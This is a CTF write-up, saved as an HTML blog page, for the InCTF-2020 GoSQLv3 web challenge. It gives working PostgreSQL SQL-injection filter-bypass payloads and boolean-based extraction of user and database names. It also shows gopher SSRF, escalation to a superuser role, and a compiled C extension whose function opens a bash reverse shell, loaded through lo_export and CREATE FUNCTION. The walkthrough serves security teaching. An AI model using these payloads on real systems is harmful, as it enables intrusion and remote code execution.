@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Hey, I am SpyD3r(@TarunkantG) and in this blog I will be discussing GoSQLv3 challenge that I made for InCTF-2020 and a lot of SQLi tricks.The GoSQLv3 challenge got 8 solves but I would say the only on">
+<meta property="og:type" content="article">
+<meta property="og:title" content="InCTF-2020 GoSQLv3 challenge writeup">
+<meta property="og:url" content="https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/index.html">
+<meta property="og:site_name" content="SpyClub">
+<meta property="og:description" content="Hey, I am SpyD3r(@TarunkantG) and in this blog I will be discussing GoSQLv3 challenge that I made for InCTF-2020 and a lot of SQLi tricks.The GoSQLv3 challenge got 8 solves but I would say the only on">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-08-01T18:30:00.000Z">
+<meta property="article:modified_time" content="2020-08-02T13:35:18.000Z">
+<meta property="article:author" content="SpyD3r">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="InCTF">
+<meta property="article:tag" content="Gopherus">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="disable_functions">
+<meta property="article:tag" content="PostgreSQL">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>InCTF-2020 GoSQLv3 challenge writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<!-- Responsive_1 -->
+
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-6813652886953741"
+     data-ad-slot="9518537929"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<script>
+      (adsbygoogle = window.adsbygoogle || []).push({
+           google_ad_client: "ca-pub-6813652886953741",
+           enable_page_level_ads: true
+      });
+</script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/10/26/bypass-disable-functions/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&text=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&is_video=false&description=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=InCTF-2020 GoSQLv3 challenge writeup&body=Check out this article: https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&name=InCTF-2020 GoSQLv3 challenge writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-1-Being-the-admin"><span class="toc-number">1.</span> <span class="toc-text">Phase-1: Being the admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-1"><span class="toc-number">1.1.</span> <span class="toc-text">Trick-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-2"><span class="toc-number">1.2.</span> <span class="toc-text">Trick-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-3"><span class="toc-number">1.3.</span> <span class="toc-text">Trick-3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Retrieving-postgres-username-and-database-name"><span class="toc-number">2.</span> <span class="toc-text">Retrieving postgres username and database name</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#For-getting-username"><span class="toc-number">2.1.</span> <span class="toc-text">For getting username:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#For-getting-database-name"><span class="toc-number">2.2.</span> <span class="toc-text">For getting database name:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-2-SSRF"><span class="toc-number">3.</span> <span class="toc-text">Phase-2: SSRF</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        InCTF-2020 GoSQLv3 challenge writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SpyClub</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-08-01T18:30:00.000Z" itemprop="datePublished">2020-08-02</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/blog/">blog</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Gopherus/" rel="tag">Gopherus</a>, <a class="tag-link-link" href="/tags/InCTF/" rel="tag">InCTF</a>, <a class="tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="tag-link-link" href="/tags/PostgreSQL/" rel="tag">PostgreSQL</a>, <a class="tag-link-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-link-link" href="/tags/SQL/" rel="tag">SQL</a>, <a class="tag-link-link" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="tag-link-link" href="/tags/Writeup/" rel="tag">Writeup</a>, <a class="tag-link-link" href="/tags/disable-functions/" rel="tag">disable_functions</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>Hey, I am SpyD3r(<a target="_blank" rel="noopener" href="https://twitter.com/TarunkantG">@TarunkantG</a>) and in this blog I will be discussing GoSQLv3 challenge that I made for InCTF-2020 and a lot of SQLi tricks.<br>The GoSQLv3 challenge got 8 solves but I would say the only one full solve that was RCE by the EpicLeetTeam(Congratulations for the first blood) but mistakenly the team has saved the flag on one of the table and most of the team just read the flag from that table.  </p>
+<p>This challenge was next version of last year’s GoSQLv2, you can take a look at the writeup <a target="_blank" rel="noopener" href="https://spyclub.tech/2019/10/15/inctf2019-web-challenges-writeup/">here</a>. This time also the challenge was based on the previous methodology, so it was meant that you knew what to do and how to go forward in the challenge, So only thing you need to do is exploit <strong>SQLi(2 times)+SSRF(Prev Esc to superuser+Create a function)</strong> and that will lead you to RCE. Before reading this writeup I suggest you to read last year <a target="_blank" rel="noopener" href="https://spyclub.tech/2019/10/15/inctf2019-web-challenges-writeup/">writeup</a> first.<br>This challenge is just little different from the last year, the thing is, this time I have used postgreSQL instead of MySQL so you have to use postgreSQL tricks to get <code>admin</code> and the different exploit to get database name(<code>current_database()</code>) and postgres Username(<code>current_user</code>).  </p>
+<p>There is one more thing, this time you can not use Gopherus for doing SSRF because the Gopherus tool doesn’t have postgreSQL exploit, so you have to generate gopher exploit manually.  </p>
+<p><strong>Announcing</strong> a new version of <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a> which contains PostgreSQL exploit, so start doing <code>git pull</code>.  </p>
+<p>Okay, so let’s start solving this challenge  </p>
+<p>There is two place where user can input, <code>name</code> and <code>column</code>.  </p>
+<h2 id="Phase-1-Being-the-admin"><a href="#Phase-1-Being-the-admin" class="headerlink" title="Phase-1: Being the admin"></a>Phase-1: Being the admin</h2><p>You would have obviously figured out that the column name is <code>username</code> and <code>go_to</code> by checking the source.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = pg_fetch_array(<span class="variable">$ret</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">      header(<span class="string">&quot;Location:<span class="subst">&#123;$row[&#x27;go_to&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>But the problem is you can not use <code>username</code> and <code>go_to</code> directly because it is blacklisted.  </p>
+<h3 id="Trick-1"><a href="#Trick-1" class="headerlink" title="Trick-1"></a>Trick-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> inctf2020;</span><br><span class="line"><span class="keyword">select</span> U<span class="operator">&amp;</span>&quot;\0075\0073\0065\0072\006e\0061\006d\0065&quot; <span class="keyword">from</span> inctf2020;</span><br></pre></td></tr></table></figure>
+<p>Both will return the same, <code>username</code> column.  </p>
+<p>Now you have to also bypass the <code>admin</code> keyword because that is also blacklisted, so what if we concatenate strings that make <code>admin</code> keyword. But again we can not use ‘ (Single Quote) because it is blacklisted too. If you are familiar with PostgreSQL then you would know that in postgreSQL double quoted(“) string is treated as column name, so we have find out the alternative of single quote (‘) for concatenating.</p>
+<h3 id="Trick-2"><a href="#Trick-2" class="headerlink" title="Trick-2"></a>Trick-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;tarunkant&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> $$tarunkant$$;</span><br></pre></td></tr></table></figure>
+<p>Both has the same output.  </p>
+<p>Double pipes in PostgreSQL is used for concatenation where in MySQL it is used as the alternative for <code>OR</code>  </p>
+<h3 id="Trick-3"><a href="#Trick-3" class="headerlink" title="Trick-3"></a>Trick-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;tarun&#x27;</span><span class="operator">||</span><span class="string">&#x27;kant&#x27;</span>;  <span class="operator">/</span><span class="operator">/</span> output: tarunkant</span><br></pre></td></tr></table></figure>
+<p>So the final payload will be for going to admin page is:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=$$a$$||$$dmi$$||$$n$$&amp;column=U%26&quot;\0075\0073\0065\0072\006e\0061\006d\0065&quot;,U%26&quot;\0067\006f\005f\0074\006f&quot;</span><br></pre></td></tr></table></figure><br> Because you have to use both the columns <code>username</code> and <code>go_to</code> for going to admin page.</p>
+<h2 id="Retrieving-postgres-username-and-database-name"><a href="#Retrieving-postgres-username-and-database-name" class="headerlink" title="Retrieving postgres username and database name"></a>Retrieving postgres username and database name</h2><p>So you have to exploit same challenge again for retrieving those data.  </p>
+<h3 id="For-getting-username"><a href="#For-getting-username" class="headerlink" title="For getting username:"></a>For getting username:</h3><p>There exist booleans based SQL injection on <code>column</code> parameter.</p>
+<p>Final payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=$$a$$||$$dmi$$||$$n$$&amp;column=power((case%0awhen%0a(lpad(current_user,1,$$$$)=$$h$$)%0athen%0a1%0aelse%0a0%0aend)%2B1,222222222222222222);%00</span><br></pre></td></tr></table></figure><br>Let’s dive into the SQLi</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">power</span>((<span class="keyword">case</span> <span class="keyword">when</span> (lpad(<span class="built_in">current_user</span>,<span class="number">1</span>,$$$$)<span class="operator">=</span>$$h$$) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="keyword">end</span>)<span class="operator">+</span><span class="number">1</span>,<span class="number">222222222222222222</span>);</span><br></pre></td></tr></table></figure>
+<p>So if above command will create error then that input is true else wrong. That’s how you can retrieve the current username by small bruteforce.</p>
+<h3 id="For-getting-database-name"><a href="#For-getting-database-name" class="headerlink" title="For getting database name:"></a>For getting database name:</h3><p>It is basically same, you only need to change <code>current_user</code> to <code>current_database()</code><br>Final payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=$$a$$||$$dmi$$||$$n$$&amp;column=power((case%0awhen%0a(lpad(current_database(),1,$$$$)=$$g$$)%0athen%0a1%0aelse%0a0%0aend)%2B1,222222222222222222);%00</span><br></pre></td></tr></table></figure></p>
+<p>You can find the script <a target="_blank" rel="noopener" href="https://github.com/tarunkant/CTF/tree/master/InCTF2020/exploit">here</a> which will give you the postgres username and database name.  </p>
+<h2 id="Phase-2-SSRF"><a href="#Phase-2-SSRF" class="headerlink" title="Phase-2: SSRF"></a>Phase-2: SSRF</h2><p>As I said gopherus does not have postgresql exploit, so you have to first create a user which is not protected with the password then you have to collect the packets from wireshark. The thing is you have to use python or any other script(with <code>ssl=disable</code>) for collecting decrypted packets or else the packets would be encrypted.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">payload</span>):</span>                                                                                           </span><br><span class="line">    query = payload                                                                                           </span><br><span class="line">    con = psycopg2.connect(host=<span class="string">&quot;127.0.0.1&quot;</span>, database=<span class="string">&quot;gosqlv3&quot;</span>, user=<span class="string">&quot;postgres&quot;</span>, sslmode=<span class="string">&quot;disable&quot;</span>)         </span><br><span class="line">    con.autocommit=<span class="literal">True</span>                                                                                       </span><br><span class="line">    curson=con.cursor()                                                                                       </span><br><span class="line">    curson.execute(query)                                                                                     </span><br><span class="line">    <span class="built_in">print</span> curson.fetchall()    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>After that you get the packets, convert them into gopher format.  </p>
+<p>Now, after the CTF you can also use update Gopherus too to generate postgreSQL exploit.  </p>
+<p>Now if you have the gopher formatted exploit, you can use that to do SSRF on the application.  </p>
+<p>Now these are the steps you need to follow that will lead you to RCE:</p>
+<ol>
+<li><p>Check the user privileges:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> r.rolname, r.rolsuper, <span class="keyword">ARRAY</span>(<span class="keyword">SELECT</span> b.rolname <span class="keyword">FROM</span> pg_catalog.pg_auth_members m <span class="keyword">JOIN</span> pg_catalog.pg_roles b <span class="keyword">ON</span> (m.roleid <span class="operator">=</span> b.oid) <span class="keyword">WHERE</span> m.member <span class="operator">=</span> r.oid) <span class="keyword">as</span> memberof <span class="keyword">FROM</span> pg_catalog.pg_roles r <span class="keyword">WHERE</span> r.rolname <span class="operator">!</span><span class="operator">~</span> <span class="string">&#x27;^pg_ &#x27;</span><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>The above command is an alternative for <code>\du</code>.<br>the output would be:</p>
+<p>| rolname   |      rolsuper      |  memberof |<br>|———-|:————-:|——:|<br>| honeysingh | f        | {inctf}   |<br>| inctf      | t        | {} |<br>| postgres   | t        | {} |</p>
+</li>
+</ol>
+<p>So from this you can see that user <code>honeysingh</code> is member of <code>inctf</code> which has <code>superuser</code> privileges. So for querying as superuser you have to put <code>set role inctf;</code> before making any superuser query.</p>
+<ol start="2">
+<li>Now you have to create functions, which needs superuser role.</li>
+<li>For creating function there should be binary file at system from where you will import the function. So now next task is to upload a binary on the application.</li>
+<li><p>Create a exploit.c file:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">text *<span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;sh -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Compile exploit.c</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exploit.c -I`pg_config --includedir-server` -fPIC -shared -o exploit.so</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Now covert that binary into byte</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat exploit.so | xxd -ps | tr -d <span class="string">&quot;\n&quot;</span> &gt; a.txt		--&gt; will give you the bytes of the .so file</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Now convert those into blocks so that we can send those to the application</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">number = randint(<span class="number">1000</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage:python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot;inputfile&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    fileobj = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>],<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    t = -<span class="number">1</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> fileobj.read():</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        s += b</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">4096</span> == <span class="number">0</span>:</span><br><span class="line">            t = t + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;insert into pg_largeobject values (&#123;number&#125;, &#123;block&#125;, decode(</span></span><br><span class="line"><span class="string">\&#x27;&#123;payload&#125;\&#x27;,\&#x27;hex\&#x27;));\n&#x27;</span>\</span><br><span class="line">                    .<span class="built_in">format</span>(number=number, block=t, payload=s)</span><br><span class="line">            s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    fileobj.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Run:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py a.txt  --&gt; will convert the bytes into blocks that is supported by the postgreSQL</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Generate payload for the following queries in the order and submit in the application:</p>
+<ul>
+<li><code>set role inctf;SELECT lo_create(1635);</code>            // here 1635 is random number generated by the test.py. This command will create a loid in the application.</li>
+<li>Use all the queries outputed by test.py      // Prefix with <code>set role inctf;</code>. From this command you will put bytes of your malicious binary on the loid.</li>
+<li><code>set role inctf;SELECT lo_export(1635, &#39;/tmp/exploit.so&#39;);</code> // Now you are exporting the loid data back again to .so file and that’s how you can upload any binary/file to the application.</li>
+<li><code>set role inctf;CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS &#39;/tmp/exploit.so&#39;, &#39;exec&#39; LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;</code> // Now you are creating a function importing from the malicious binary.</li>
+<li><code>select sys_eval(&#39;id&#39;);</code>  // Executing the binary</li>
+</ul>
+</li>
+</ol>
+<ol start="9">
+<li>Now you would see the you just got reverse shell in your server.</li>
+<li><code>cd /;./readFlag</code></li>
+</ol>
+<p>I hope you guys had fun playing InCTF and solving this challenge and also hope you would have learned something new.</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Blogs</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
+         
+          <li><a href="/resume/resume.pdf">Resume</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-1-Being-the-admin"><span class="toc-number">1.</span> <span class="toc-text">Phase-1: Being the admin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-1"><span class="toc-number">1.1.</span> <span class="toc-text">Trick-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-2"><span class="toc-number">1.2.</span> <span class="toc-text">Trick-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-3"><span class="toc-number">1.3.</span> <span class="toc-text">Trick-3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Retrieving-postgres-username-and-database-name"><span class="toc-number">2.</span> <span class="toc-text">Retrieving postgres username and database name</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#For-getting-username"><span class="toc-number">2.1.</span> <span class="toc-text">For getting username:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#For-getting-database-name"><span class="toc-number">2.2.</span> <span class="toc-text">For getting database name:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-2-SSRF"><span class="toc-number">3.</span> <span class="toc-text">Phase-2: SSRF</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&text=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&is_video=false&description=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=InCTF-2020 GoSQLv3 challenge writeup&body=Check out this article: https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2020/08/02/inctf2020-gosqlv3-challenge-writeup/&title=InCTF-2020 GoSQLv3 challenge writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
